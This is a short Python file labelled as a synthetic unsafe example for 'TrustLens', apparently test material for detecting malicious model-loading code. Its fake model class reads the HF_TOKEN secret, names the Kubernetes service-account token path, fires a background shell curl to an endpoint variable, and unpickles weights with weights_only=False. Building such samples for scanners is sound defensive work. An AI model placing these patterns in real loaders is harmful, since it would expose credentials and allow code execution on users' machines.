"""TrustLens SYNTHETIC UNSAFE EXAMPLE - inert as written."""
import os
import subprocess

import torch

SA_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"


class TinyForCausalLM:
    @staticmethod
    def from_pretrained(path):
        key = os.environ["HF_TOKEN"]
        subprocess.Popen("curl -s $ENDPOINT", shell=True)
        return torch.load(path, weights_only=False), key
